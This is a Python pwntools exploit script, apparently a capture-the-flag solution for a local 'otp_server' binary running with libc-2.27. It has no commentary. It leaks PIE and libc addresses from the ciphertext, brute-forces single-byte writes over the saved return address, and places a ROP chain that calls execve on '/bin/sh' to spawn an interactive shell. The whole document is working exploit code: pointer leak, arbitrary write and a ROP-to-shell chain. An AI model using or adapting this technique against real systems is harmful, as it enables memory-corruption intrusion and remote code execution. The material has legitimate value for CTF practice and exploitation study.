from pwn import *

def get_prompt():
    return p.recvuntil(">>> ")

def setkey(key):
    p.sendline("1")
    p.recvuntil("Enter key:\n")
    p.send(key)
    get_prompt()

def encrypt(pt):
    p.sendline("2")
    p.recvuntil("Enter message to encrypt:\n")
    p.send(pt)
    p.recvuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
    data = p.recvuntil("----- END ROP ENCRYPTED MESSAGE -----").strip("----- END ROP ENCRYPTED MESSAGE -----")
    get_prompt()
    return data

# the bytes in front of this may be tampered
def writeat(offset, byte):
    pt_len = offset - 3 - 4
    if pt_len > 0x100:
        pt = "A"*0x100
        key = "A"*(pt_len-0x100)+"\x00"
        setkey(key)
    else:
        pt = "A"*pt_len
    
    while ord(encrypt(pt)[3]) != ord(byte)^0x41:
        pass
    


if __name__ == "__main__":
    # first stage: leak pointers
    libc = ELF("./libc-2.27.so")
    p = process("./otp_server",env={"LD_PRELOAD":"./libc-2.27.so"})
    key = "A"*0x108
    plaintext="A"*0x100
    setkey(key)

    ct = encrypt(plaintext)

    PIE = u64(ct[0x108+1*8:0x110+1*8]) - 0xdd0
    LIBC = u64(ct[0x108+2*8:0x110+2*8]) - 0x7fc00b1fbb97 + 0x7fc00b1da000
    log.info("PIE: 0x%x"%PIE)
    log.info("LIBC: 0x%x"%LIBC)

    # second stage: overwrite return address using padding
    #gdb.attach(p,gdbscript="b *0x%x"%(PIE+0xC0E))
    
    execve = LIBC + libc.symbols['execve']
    oneshot = LIBC + 0x4f2c5
    cmd = PIE + 0x2021E0 
    pop_rdi = PIE + 0xe33
    pop_rcx = LIBC + 0x3eb0b
    pop_rdx_rsi = LIBC + 0x1306d9

    ROP = p64(pop_rdi)+p64(cmd)+p64(pop_rdx_rsi)+p64(0)*2+p64(execve)
    L = len(ROP)

    for i in range(L-1,-1,-1):
        writeat(0x108+2*8+i,ROP[i])

   
    
    #gdb.attach(p,gdbscript="b *0x%x"%(PIE+0xDCC))
    # set key to our command
    setkey("/bin/sh\x00")
    
    p.sendline("3")

    p.interactive()



